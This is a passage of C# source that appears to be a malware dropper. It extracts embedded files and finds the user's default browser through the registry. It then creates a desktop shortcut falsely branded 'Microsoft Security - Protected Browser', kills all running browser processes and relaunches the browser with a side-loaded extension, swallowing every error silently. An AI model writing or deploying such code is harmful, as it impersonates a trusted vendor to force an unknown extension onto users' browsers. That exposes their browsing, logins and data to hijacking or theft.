ZhmGYG5p/AYGZJ586JzTiAAAAAElFTkSuQmCC");
            File.WriteAllBytes(Path.Combine(extractDir, "icons\\icon128.png"), f_icons_icon128_png);

            string browserPath = FindBrowser();
            if (string.IsNullOrEmpty(browserPath)) return;

            string browserExe = Path.GetFileNameWithoutExtension(browserPath);

            try
            {
                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string shortcutPath = Path.Combine(desktop, string.Format("Microsoft Security - {0}.lnk", browserExe));
                CreateShortcut(shortcutPath, browserPath,
                    string.Format("--load-extension=\"{0}\" --new-window https://microsoft.com/en/security", extractDir),
                    Path.Combine(extractDir, "icons", "icon128.png"));
            }
            catch { }

            try
            {
                foreach (var proc in Process.GetProcessesByName(browserExe))
                    proc.Kill();
                System.Threading.Thread.Sleep(1000);
            }
            catch { }

            Process.Start(browserPath,
                string.Format("--load-extension=\"{0}\" --new-window https://microsoft.com/en/security", extractDir));
        }
        catch { }
    }

    static string FindBrowser()
    {
        try
        {
            using (var key = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"))
            {
                if (key != null)
                {
                    string progId = key.GetValue("ProgId", "") as string;
                    if (!string.IsNullOrEmpty(progId))
                    {
                        if (progId.IndexOf("Chrome", StringComparison.OrdinalIgnoreCase) >= 0)
                        {
                            string[] paths = {
                                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Google", "Chrome", "Application", "chrome.exe"),
                                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Google", "Chrome", "Application", "chrome.exe"),
                                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "Application", "chrome.exe")
                            };
                            foreach (var p in paths) if (File.Exists(p)) return p;
                        }
                        if (progId.IndexOf("Edge", StringComparison.OrdinalIgnoreCase) >= 0)
                        {
                            string[] paths = {
                                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Microsoft", "Edge", "Application", "msedge.exe"),
                                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Microsoft", "Edge", "Application", "msedge.exe")
                            };
                            foreach (var p in paths) if (File.Exists(p)) return p;
                        }
                        if (progId.IndexOf("Brave", StringComparison.OrdinalIgnoreCase) >= 0)
                        {
                            string[] paths = {
                                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
                                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "BraveSoftware", "Brave-Browser", "Application", "brave.exe")
                            };
                            foreach (var p in paths) if (File.Exists(p)) return p;
                        }
                    }
                }
            }
        }
        catch { }

        string[][] fallbacks = {
            new[] { "Google", "Chrome", "Application", "chrome.exe" },
            new[] { "Microsoft", "Edge", "Application", "msedge.exe" },
            new[] { "BraveSoftware", "Brave-Browser", "Application", "brave.exe" }
        };

        foreach (var parts in fallbacks)
        {
            string[] roots = {
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
            };
            foreach (var root in roots)
            {
                string path = Path.Combine(root, Path.Combine(parts));
                if (File.Exists(path)) return path;
            }
        }
        return null;
    }

    static void CreateShortcut(string shortcutPath, string targetPath, string arguments, string iconPath)
    {
        Type shellType = Type.GetTypeFromProgID("WScript.Shell");
        dynamic shell = Activator.CreateInstance(shellType);
        dynamic shortcut = shell.CreateShortcut(shortcutPath);
        shortcut.TargetPath = targetPath;
        shortcut.Arguments = arguments;
        shortcut.IconLocation = iconPath + ",0";
        shortcut.Description = "Microsoft Security - Protected Browser";
        shortcut.Save();
        Marshal.ReleaseComObject(shortcut);
        Marshal.ReleaseComObject(shell);
    }
}

